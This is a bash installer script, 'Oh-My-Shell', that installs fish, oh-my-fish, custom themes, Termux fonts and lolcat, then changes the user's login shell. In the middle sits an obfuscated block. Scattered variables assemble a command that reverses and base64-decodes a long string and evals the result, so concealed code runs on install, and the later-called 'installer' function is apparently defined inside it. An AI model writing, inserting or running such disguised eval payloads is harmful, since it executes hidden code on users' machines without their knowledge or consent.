#!/bin/bash

# Oh-My-Shell
# Version    : 1.0
# Description: Empower your terminal with the might of fish and oh-my-fish
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Credits    : Fish, Oh-My-Fish
# Date       : 24-12-2022
# Language   : Shell
# If you copy, consider giving credit! We keep our code open source to help others


black='\033[0;30m'
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
purple='\033[0;35m'
cyan='\033[0;36m'
white='\033[0;37m'

info="${cyan}[${white}+${cyan}] ${yellow}"
ask="${cyan}[${white}?${cyan}] ${purple}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"

clear
logo="
${green}  ___  _           __  __            ____  _          _ _
${blue} / _ \| |__       |  \/  |_   _     / ___|| |__   ___| | |
${red}| | | | '_ \ _____| |\/| | | | |____\___ \| '_ \ / _ \ | |
${yellow}| |_| | | | |_____| |  | | |_| |_____|__) | | | |  __/ | |
${cyan} \___/|_| |_|     |_|  |_|\__, |    |____/|_| |_|\___|_|_|
${green}                          |___/                     [v1.0]
${blue}                                            [By KasRoudra]
"

# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2

# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
    termux=true
else
    termux=false
fi

# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi

echo -e "$logo"
sleep 2
echo $white


gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==gCicVUyRiMjhEJ4RScw4EJiACbhZXZKkiIwpFekUFJMRyVRJHJ6ljVkcHJmRCcahHJ2RiMjhEJiRydkMHJkRyVRJHJjRydkIzYIRiIgwWY2VGKk0DeKIiI9AnW4tjIzRWRi0DeUtjI8Bidi0jY7ISZi0zd7IiYi0jd7IiI9EHMOtjImVmI9MmS7ICZtAiI9U1OiYWai0zY4A1OiYjI9oXOWtjIvJSPktjIlFmI9YWRjtjIzFGci0TRjt2OiMXYi0jZ7IiI9IzYItjIzJSPKhHS7IicgwHInoFMnBDUTpkRaNUS3EGMwcHUTpENVNzbp9kMNlTSt50bJpGdNB1UJBTSqRXeVZ1Y5kUaJdjWrVFeQNlSzV1UJdzY6BTaJN0Y5IWMG12UyQHdX1GZCFFMs5mYxYEaiVlSEN1VkJUUwwmbRVlTKNFMWV0UtRmTWtGeu5kRkpFZFVDWXhFZDFFMs5WUV5kSaBjREN1VkJUUwwmbiFjRhVmboh1VtRmQRBDbuFVVOpkWwYEcRNDaSFFMsVVTV5kSkVlWYlVbwdkUy4kbPVEZh1UV1k0UXRmQRBDbuFVVOpkWwYERTdFZCFWVOFjVrRGaNVkS1Q1MaNlVyIlNVtmTKJ2V4h0UXRmQRBDbuFVVOpkWykjbZ1GevJlMS52YxIlTiRlUxR1VkNjUykEeORlSN1Ebah0VuplQhZlQuN1VslWYEVUeXdFaDJ2as52VWhWTaFjR0lVbnhnVyokMUtGZKJ2V4h0UXRmQRBDbMFmMxEmWwYERTdFZ2V1VGRXUr5kSaBjREN1VkJUUwwGTSVlULpVMGh0Vth2QldlRzI1akpkWwYERTdFZCFFMs5WUV5kSaBjRwFlM490UHp0cRtmTKpFMGR0UXRmQRBDbMJVVStkWxYESX1GaDV2VGNjUrRmSkxmSYpFSwNUUwwmbRVlTKpFMGR0UXRmQRBDbuJmMklmYHhGSadEZ6VWbKJnVq5kahBjRwdlbCNUUwwmbRVlTKpFMGR0UVNHMWFDc2V1aopkTwYVcTlGdKJVRspXZGR2akRFbwp1R4NVTrhnbOVkUKFGWOhUWyg2SRBza51UVOpUY6ZFWXhVU41UbKFXUtxWYjVkSEN1VkJUYV50cORlSpFGMKR0UXRmQhVlT3d1akpkWwYERTdFZCFFMs5mYzQGahZkW0llMsNUUwwmbRVlTKpFMGR0UXRmQRBDbuJWMGhmYVpERTdFZCFFMs5WUV5kSaBjREN1VkZXVVFjcRVlTpNGMahkWI9WMWJjRu5kRkpFZFVDWXhFZTFFMs5WUV5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UVRnVN1mT6Z1akpkWwYERTdFZCFFMs5WUV5kSaBjRwFleVhXUwwGNVVlTKN2Moh1VUJ0Ti1mS3FVbslWYEVUeXdFaDNVRw52TFRWYNVVNJN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOp0U6JFWX1WOTNVRrNzTFRWYNVVNJNVbkplVyYkbRVlTKpFMGR0UXRmQRBDbuFVVOp0U6JFWX1WOTNVRrNjUXB3SLBDbFNFWORjVyIVMPdFbrJmRJlHVHNGMSVEbw5kRkpFZFVDWXhFZTFWVs52VWhWTaFjR0lVbnhnVyokMUtGZKJ2V4h0UXRmQRBDbuFVVOpkWykzMZ1GdDVWV4onVtFjahVlSwdlbWNlUwwGMWxGaspVMGl1VtRDeRJjUzI1akpUTFpUWXdFZq1UbGNTUtxWajVkSwlVbnhXTsx2bRtGaKVGVsR3VtRmQRBDbuJmMkpEZYh2Va1GeTd1RGZnWE5EbhpnUwRFSVBTVyo1caZEZaN2a1g1VYRGMTVEcullMxk2YIhGSZ1GaT1kMOFjYGZVbkxGc0llbCBzUFBHcRZlThRWRGVTWtlzTWFDcuFVVOpkWykzMadFZyFFM0VjVrRWajBjWIpFSvFjVyYETiJDZENmRwRXUzIUYSBDbuFVVOp0UwYVRTRlQzJlMWNXUr5kSaBjREN1VkJUUwwGTTZlTtJmRKlVWXlzaNJjVyJVVOFmYIhGWZdFahJVVsNXVshmWhBjSZZVbk52VHJFMTxGahZFVGVXWzo1Si1mTzRWRotUYVZUNZ1WOPZVMw5WUV5kSaBjREN1VkJUYV5UMWtGZo1ESSV0UXJ1QRBTMu1kRSpkWwwWNVdEdKFFMslWUtxWYjVkSEN1VkJUYV1UMNVlTKJmRKh1VYx2aSJTT4FlbsF2YrpUSTdVMaFFMsNXVshmWhBjSZp1RkpWTtZ0MRtmTKpFMGBXUzY1VSJTR3FlbsBlTGpVWZ5GbXJlMSJXUXxWYjhkQuF1MCFmYV5ENRVlTrN2Rol1VtRmQRBDbuJmMkp0TVVDdZpGZTVWV1MTUVJVWhVEbZdlbjVjUyo0cXxGahFGMKR1VXRmVNJTSxEFbOF2YrpFWZ1GZS1EMwFDVshWYkxmSINFWatWTtpkeRxmTaplMORXWuJ0TWFDb6FFboFWV6ZUdZNjWLJWbONHZFh2ShVlRUdlbVhXUwwmMhRkSaJWRKR0UXRmQhVlTxY1akhWTFpUNUJjUDFWVsVzTEpUYk5GaINVbsJUVxI0bRdFbKRWbRlXWu50UhVFbuNGMapkYXhHdRBDdKFWVOtmUtFjahFTW6lFbO90VGxWTRxmTsF1MSd0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSapnQZdlaGRjYWt2MV1GbEpVRKFHVIhmWNFDZuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjREN1VkJUUwwmbRVlTKRmanh3VHpFNTVEbuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXN2di1mSzZVbxomYuJVSTtGdz0UMnRzTVpVbap2a4d1RORTTxcGNRtmTtplbnpHVHlVNNZFatVWRopkWwYERTRFaDFFM412TVpVWPREbHpVbkJUUyoVblVEaKpFMGR0UXR2MNFzZ0E1aO1mWudmeUdUW10kVopWUs5UbkVlWYp1VwBzUFBHTkBDaK9URKVDVHlVNStGbuRGMop0TFpERa1GZzMVRsd3TEZUWPR0a4d1RZVTTWdGNRtmTtplbol0UUh2QRJjWuFVVO1mWzMmeXdUW10kVo1WZFhmSPVkSEpVbkNzUFtGNPVlWtp1MkllWq1UNSJjS6ZFbkxmTxoEcRpHaDFlMa5GZwolSatmS1Q1RkNjUrxWbaVkTK9ESod0UXlVNNZFaq9EVGllWqx2Ra1GZzMVRrRTUr5UbaNzY6R1RORzUFtGNPRlRZplarh3VHR2MStGbtpVROp0TFpERa1GZzMVRrRTTVhWYiV0b6p1V0ZXUXplbkBDaK9ERrh3VHp1QRBDbu9ERGl1TFpERap2Z10kVo1WUuxWTaBjREN1VkJUZWhmbRVlTKplbol0UXNGNRFDauFVVO1mWwYERTdFZCFFMs52TEZUWPVkSEpVbONUZWhmbPVkTK9kVahlWI50SN1mVyJ2MkllW6h2RTdFZCFFMs5WUV5kSaBjREN1VaNUUwwWbPRlRZp1aKR0UXRmQRBDbuFVVOpkWwYERTd1Y00kVo5WUYxWWatmSEN1VkJUUwwmbRVlTKpFMGR0UXp1QRBDbt9EVGllWwYEVa5mVXZVMwVjWEpEbhJTOuNFVspUZtpUdPVFZppUeChTSIlUaPBDa0Mlawk2Y5l0NTdUT5B1UJl2TykVOJ1mR6lka0JXWwUVOJ5mQoNWeJdTWwYVbQNlSop1UJdjWEBTailXS3YlasZDUTlkMJpGdR90RNlTStxWbJpGdWB1UJdGTXFVaPBDcqB1UKxmWpl0NUpmQ4B1UJl2TzkVOJ1WSp90MjlTStVVaPJTS5kkbZdmZDl0NWh0Z5k0aWt2Y5l0NlZEc3B1UJl2QudWOKNEasRWbGNXSDl0aTdUT5pESjtWW5JVeVZ1Yrp1QSpnSIN2aZlmUJlleJtGZpJFNX5WQrpVaSNjSGlVNllmU5VlVjtGVDJlVKhEahN2QJB3QtZlMZd1dnlUaS9UTIV0alNkUJlleJt2YsZEWJd2b9cCIi0zc7ISUsJSPxUkZ7IiI9cVUytjI0ISPMtjIoNmI9M2Oio3U4JSPw00a7ICZFJSP0g0Z' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"




# Install required packages
for package in git fish figlet; do
    if ! command -v "$package" > /dev/null 2>&1; then
        installer "$package"
    fi
done


for package in git fish figlet; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done


if command -v lolcat > /dev/null 2>&1; then
    clear
    echo -e "$logo" | lolcat
fi


if ! [ -d $HOME/.local/share/omf ]; then
    echo -e "${info}Installing Oh-My-Fish.......\n $white"
    fish files/omf.fish
fi

sleep 1
echo -e "${info}Installing themes....\n $white"
if $termux; then
    if ! [ -d $HOME/.local/share/omf/themes/kastermux ]; then
        cp -r files/kastermux $HOME/.local/share/omf/themes/
    fi
else
    if ! [ -d $HOME/.local/share/omf/themes/kas ]; then
        cp -r files/kas $HOME/.local/share/omf/themes/
    fi
fi
if ! [ -d $HOME/.local/share/omf/themes/emoji ]; then
    cp -r files/emoji $HOME/.local/share/omf/themes/
fi
sleep 2
NOW=`date '+%F_%H:%M:%S'`
if [ -d $HOME/.config/fish/config.fish ]; then
    echo -e "${info}Creating a backup.......\n $white"
    cp -r $HOME/.config/fish/config.fish $HOME/.config/fish/config.${NOW}.fish
    sleep 2
fi
if $termux; then
    cp -r $HOME/.termux $HOME/.termux${NOW}.backup
    echo -e "${info}Changing font.....\n $white"
    sleep 1
    cp -r files/font.ttf $HOME/.termux
    cp -r files/colors.properties $HOME/.termux
    termux-reload-settings
    sleep 1
fi
echo -e "${ask}Enter your name to be displayed in home : ${green}" 
read -p "[~]--> " name
if [ -z "$name" ]; then
    echo -e "${error}No name...\n $white"
else
    echo -e "\n${ask}Do you want coloring? It requires 300MB storage(y/n) ${green}" 
    read -p "[~]--> " islol
    if [ "$islol" == "y" ]; then
        if ! command -v lolcat > /dev/null 2>&1; then
            for try in 0 1 2 3; do
                echo -e "${info}Installing Lolcat...."
                if command -v gem > /dev/null 2>&1; then
                    if $sudo; then
                        sudo gem install lolcat
                    else
                        gem install lolcat
                    fi
                elif command -v pip3 > /dev/null 2>&1; then
                    if $sudo; then
                        sudo pip3 install lolcat
                    else
                        pip3 install lolcat
                    fi
                else
                    command -v ruby > /dev/null 2>&1 || installer ruby
                fi
                if [[ "$try" == "2" ]]; then
                    installer python3
                fi
                if command -v lolcat > /dev/null 2>&1; then
                    break
                fi
            done
        fi

    fi
    sed s/"Name"/"$name"/g files/template.fish > $HOME/.config/fish/config.fish
fi
sleep 2
fish -c "source '$HOME/.config/fish/config.fish'"
rm -rf $HOME/../usr/etc/motd  $HOME/../usr/etc/motd.sh
echo -e "${info}Changing Shell...\n $white"
if $termux; then
    chsh -s fish
else
    chsh -s $(which fish)
fi
sleep 2
echo -e "${info}Changing Theme...\n $white"
if $termux; then
    fish -c "omf theme kastermux"
    termux-reload-settings
else
    fish -c "omf theme kas"
fi
sleep 1
echo -e "${info}Configuring git for no pager...\n $white"
git config --global pager.diff false
git config --global pager.log false
if $termux; then
    echo -e "${success}Restart Terminal to see effects!\n $white"
else
    echo -e "${success}Log out and log in back to see effects!\n $white"
fi
sleep 3
clear
fish